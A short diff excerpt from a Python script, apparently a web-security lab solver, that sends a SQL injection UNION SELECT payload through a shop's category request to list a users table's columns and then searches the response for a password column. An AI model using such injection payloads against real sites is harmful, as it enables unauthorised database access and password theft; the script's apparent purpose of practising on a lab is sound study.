@@ -48,6 +48,9 @@ def main(args):
     resp = shop.get_category(
         f"' UNION SELECT {nulls} from information_schema.columns where table_name = '{users_table}'-- "
     )
+    
+    
+    
     #passwords
     pattern = re.compile(r"<th>(password_.*?)</th>")
     m = pattern.search(resp.text)
